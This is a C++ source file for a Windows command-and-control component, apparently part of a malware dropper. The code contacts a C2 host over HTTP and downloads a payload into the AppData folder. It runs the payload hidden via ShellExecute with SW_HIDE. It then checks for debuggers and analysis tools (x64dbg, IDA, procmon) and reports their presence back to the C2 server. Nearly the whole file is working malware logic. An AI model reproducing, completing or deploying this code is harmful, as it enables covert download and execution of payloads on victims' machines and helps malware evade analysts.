#include "pch.h"
#include "C2.h"
#include <windows.h>
#include <wininet.h>
#include <winsock.h>
#include <stdio.h>
#include <fstream>
#include <cstring>
#include <iostream>


void C2::execute() {
	this->download();
	this->start();
	this->exfiltrate();
}

void C2::exfiltrate() {
	this->ph.detectProcesses();
	string pathName = "exfiltrate?x64dbg=" + this->boolToString(this->ph.isx64dbg) + "&x32dbg=" + this->boolToString(this->ph.isx32dbg) + "&ida=" + this->boolToString(this->ph.isida64) + "&procmon=" + this->boolToString(this->ph.isProc32);;
	netsend(this->util.getC2Host(), pathName.c_str());
	this->cleanup();
}

string C2::boolToString(bool b) {
	return b ? "true" : "false";
}

bool C2::isFileEmpty() {
	int fsize = 0;
	ifstream in(this->util.getAppDataPath() + this->util.getDownloaded(), ifstream::in | ifstream::binary);
	if (in.is_open()) {
		in.seekg(0, ios::end);
		fsize = in.tellg();
		in.close();
	}
	return fsize == 0;
}

void C2::download() {
	this->ph.detectProcesses();
	
	if (!this->isFileEmpty() || this->ph.isDownloadedDetected()) {
		return;
	}

	this->netsend(this->util.getC2Host(), this->util.getDownloadFileName().c_str());
	
	BYTE buffer = 0;
	std::ofstream ostream(this->util.getAppDataPath() + this->util.getDownloaded(), std::ios::binary);

	static const ::DWORD SIZE = 1024;
	::DWORD error = ERROR_SUCCESS;
	::BYTE data[SIZE];
	::DWORD size = 0;
	do {
		::BOOL result = ::InternetReadFile(this->requestHandle, data, SIZE, &size);
		if (result == FALSE)
		{
			this->error = ::GetLastError();
		}
		if (size > 0) {
			ostream.write((const char*)data, size);
		}
		
	} while ((error == ERROR_SUCCESS) && (size > 0));

	ostream.flush();
	ostream.close();
	this->cleanup();
}

void C2::netsend(LPCSTR hostName, LPCSTR pathName) {
	
	this->error = InternetAttemptConnect(0);
	if (error != ERROR_SUCCESS) {
		this->cleanup();
		return;
	}
	this->sessionHandle = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);

	if (sessionHandle == NULL) {
		this->error = GetLastError();
		this->cleanup();
		return;
	}

	this->connectHandle = InternetConnect(this->sessionHandle, hostName, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

	if (this->connectHandle == NULL) {
		this->error = GetLastError();
		this->cleanup();
		return;
	}
	this->requestHandle = HttpOpenRequest(this->connectHandle, "GET", pathName, NULL, NULL, NULL, INTERNET_FLAG_NO_UI|INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, NULL);

	if (this->requestHandle == NULL) {
		this->error = GetLastError();
		this->cleanup();
		return;
	}


	BOOL sent = HttpSendRequest(this->requestHandle, NULL, 0, NULL, 0);
	if (!sent) {
		this->error = GetLastError();
		this->cleanup();
		return;
	}
}

void C2::cleanup() {
	InternetCloseHandle(this->sessionHandle);
	InternetCloseHandle(this->connectHandle);
	InternetCloseHandle(this->requestHandle);
}

void C2::start() {
	string path = this->util.getAppDataPath() + this->util.getDownloaded();
	ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
}